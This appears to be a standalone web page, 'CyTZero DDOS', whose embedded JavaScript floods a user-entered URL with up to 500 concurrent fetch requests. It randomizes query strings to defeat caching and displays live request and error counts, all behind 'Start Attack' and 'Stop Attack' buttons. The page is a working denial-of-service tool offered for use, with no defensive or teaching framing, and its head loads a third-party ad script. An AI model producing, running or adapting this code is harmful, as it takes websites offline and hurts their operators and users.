
<!DOCTYPE html>
<html lang="en">
<head>
<script type='text/javascript' src='//pl24703755.profitablecpmrate.com/dc/ec/41/dcec4195ed578104c405647a4c41c87b.js'></script>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> CyTZero </title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f4f8; /* Light blue background */
            color: #333; /* Dark text color for better readability */
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
        }

        thead {
            background-color: #007BFF; /* Blue header */
            color: white; /* White text color for header */
        }

        th,
        td {
            text-align: left;
            padding: 12px; /* Increased padding for a spacious feel */
            border-bottom: 1px solid #ddd;
        }

        tr:nth-child(even) {
            background-color: #f2f2f2; /* Light grey for even rows */
        }

        tr:hover {
            background-color: #e1f5fe; /* Light blue on hover */
        }

        #stats {
            width: 80%;
            margin: auto;
        }

        div {
            display: flex;
            justify-content: center;
            margin-top: 20px;
            margin: 20px;
        }

        input[type="text"] {
            width: 50%;
            padding: 10px;
            margin-right: 10px;
            border-radius: 5px;
            margin: 0.5%;
            border: 1px solid #007BFF; /* Blue border for input */
        }

        button {
            padding: 10px 20px;
            border: none;
            background-color: #007BFF; /* Blue button */
            color: white; /* White text */
            cursor: pointer;
            margin: 0.5%;
            border-radius: 5px; /* Rounded corners */
        }

        button:hover {
            background-color: #0056b3; /* Darker blue on hover */
        }
    </style>
</head>
<body>
    <h1>CyTZero DDOS</h1>
    <div id="controls">
        <input type="text" id="urlInput" placeholder="Enter URL to attack" />
        <button id="startBtn">Start Attack</button>
        <button id="stopBtn" disabled>Stop Attack</button>
    </div>
    <div id="stats"></div>

    <script>
        var targets = {
            '': { number_of_requests: 0, number_of_errored_responses: 0 },
        };

        var statsEl = document.getElementById('stats');
        var attackRunning = false;
        var targetUrl = '';
        var floodPromise = null;

        function printStats() {
            statsEl.innerHTML = '<table border="1"><thead><tr><th>Web</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' +
                Object.entries(targets).map(([target, { number_of_requests, number_of_errored_responses }]) =>
                    '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>';
        }
        setInterval(printStats, 1000);

        const CONCURRENCY_LIMIT = 500;
        var queue = [];

        async function fetchWithTimeout(resource, options) {
            const controller = new AbortController();
            const id = setTimeout(() => controller.abort(), options.timeout);
            return fetch(resource, {
                mode: 'no-cors',
                signal: controller.signal
            }).then((response) => {
                clearTimeout(id);
                return response;
            }).catch((error) => {
                console.log(error.code);
                clearTimeout(id);
                throw error;
            });
        }

        async function flood(target) {
            for (var i = 0;; ++i) {
                if (queue.length >= CONCURRENCY_LIMIT) {
                    await queue.shift();
                }
                var rand = i % 3 === 0 ? '' : ('?' + Math.random() * 26000);
                queue.push(
                    fetchWithTimeout(target + rand, { timeout: 1000 })
                        .catch((error) => {
                            if (error.code === 20 /* ABORT */) {
                                return;
                            }
                            targets[target].number_of_errored_responses++;
                        })
                        .then((response) => {
                            if (response && !response.ok) {
                                targets[target].number_of_errored_responses++;
                            }
                            targets[target].number_of_requests++;
                        })
                );
            }
        }

        function startFlood(target) {
            if (!attackRunning) {
                attackRunning = true;
                targets[target] = { number_of_requests: 0, number_of_errored_responses: 0 };
                floodPromise = flood(target);
            }
        }

        function stopFlood() {
            if (attackRunning) {
                attackRunning = false;
                queue.forEach(p => p.abort());
                queue = [];
                targets = { '': { number_of_requests: 0, number_of_errored_responses: 0 } }; // Reset stats
            }
        }

        document.getElementById('startBtn').addEventListener('click', () => {
            const url = document.getElementById('urlInput').value;
            if (url) {
                targetUrl = url;
                startFlood(targetUrl);
                document.getElementById('stopBtn').disabled = false;
                document.getElementById('startBtn').disabled = true;
            }
        });

        document.getElementById('stopBtn').addEventListener('click', () => {
            stopFlood();
            document.getElementById('stopBtn').disabled = true;
            document.getElementById('startBtn').disabled = false;
        });
    </script>

    
</body>
</html>
